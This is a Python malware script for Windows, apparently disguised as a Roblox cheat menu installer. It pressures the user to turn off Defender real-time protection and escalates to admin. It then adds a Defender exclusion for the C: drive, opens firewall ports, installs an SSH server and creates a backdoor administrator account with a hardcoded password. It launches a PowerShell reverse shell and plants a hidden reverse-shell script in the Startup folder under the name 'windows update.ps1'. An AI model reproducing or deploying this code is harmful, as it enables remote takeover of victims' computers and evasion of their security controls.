#!/usr/bin/env python3

import os

import sys

from sys import exit

import platform
 
import subprocess

import subprocess as sub

import ctypes

import base64

import shutil

import socket

import re

import time

import sysconfig
#------------------------
#CONDITIONS
if os.name != "nt":
    exit()
win_av = subprocess.run('C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Get-MpComputerStatus',shell=True, capture_output=True).stdout.decode()
if re.search("RealTimeProtectionEnabled        : True", win_av):
    ctypes.windll.user32.MessageBoxW(0, "Real Time Protection Must Be Disabled For Install", "Error", 1)
    exit()
else:
    print("HAHAHAHAHHAHAHAHA")
#------------------------
#VARIABLES
current_user = os.getenv('username')
cpu_count = os.cpu_count()
arch = os.environ["PROCESSOR_ARCHITECTURE"]
platform_arch = platform.architecture()
windows_version = sys.getwindowsversion()
ssh_username = "defaultuser"
ssh_passwds = "PassW0rd1@"
#------------------------
#REQUIRE_ADMIN_PRIVS
if not ctypes.windll.shell32.IsUserAnAdmin():
    print("PRIV:ERROR")
    ctypes.windll.shell32.ShellExecuteW(
        None, 'runas', sys.executable, ' '.join(sys.argv), None, None)
    exit(0)
else:
    print("RIPRIPRIPRIPRIP")
time.sleep(0.5)
#------------------------
#PAYLOAD
print("rip")
shutil.move("roblox_external_menu_x64.exe","C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\roblox_external_menu_x64.exe")
time.sleep(0.5)
subprocess.run('powershell.exe Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine -Force', shell=True)
time.sleep(0.5)
subprocess.run('powershell.exe Add-MpPreference -ExclusionPath “C:”', shell=True)
time.sleep(0.5)
subprocess.run('powershell.exe New-NetFirewallRule -DisplayName "THISONEDICKHEAD" -Direction inbound -Profile Any -Action Allow -LocalPort 80,22 -Protocol TCP', shell=True)
time.sleep(0.5)
subprocess.run('powershell.exe New-NetFirewallRule -DisplayName "THISONEDICKHEAD" -Direction outbound -Profile Any -Action Allow -LocalPort 80,22,443 -Protocol TCP', shell=True)
time.sleep(0.5)
subprocess.run("powershell.exe Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0", shell=True)
time.sleep(0.5)
subprocess.run("powershell.exe Set-Service -Name sshd -StartupType 'Automatic'", shell=True)
time.sleep(0.5)
subprocess.run("powershell.exe Start-Service sshd", shell=True)
time.sleep(0.5)
command = """
$nusnm = """ + '"{}"'.format(ssh_username) + """ 
$nuspss = ConvertTo-SecureString """ + '"{}"'.format(ssh_passwds) + """ -AsPlainText -Force
New-LocalUser -Name $nusnm -Password $nuspss
Add-LocalGroupMember -Group "Administrators" -Member $nusnm
Get-LocalUser
"""
print(command)
exec = sub.Popen(["powershell","& {" + command + "}"], shell=True)
print("HELLO")
time.sleep(1)
try:  
    subprocess.run("powershell.exe New-Object System.Net.Sockets.TCPClient('0.0.0.0',0);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex \". { $data } 2>&1\" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()", shell=True)
except:
    print("RIP_ME")
    time.sleep(0.5)
#------------------------
#PERSISTENCE
if os.path.exists("C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923") >= True:
    print("Nice_Already_Got_Me_A_Seat")
else:
    os.mkdir("C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923")
    time.sleep(0.5)
f = open("C:\\Users\\" + current_user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows update.ps1", 'w')
time.sleep(0.5)
f.write(""""
$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $t -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
$client = New-Object System.Net.Sockets.TCPClient('0.0.0.0',00);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
""")
time.sleep(0.5)
shutil.move("roblox_external_menu_x64.exe","C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\roblox_external_menu_x64.exe")
time.sleep(0.5)
#os.system( "attrib +h C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923")
#------------------------
#ENUMERATING_FILE_SYSTEM
#------------------------
#TCP_CONNECT_DOOM_SERVER
#------------------------
#CYA
time.sleep(5)
shutil.rmtree("C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923")

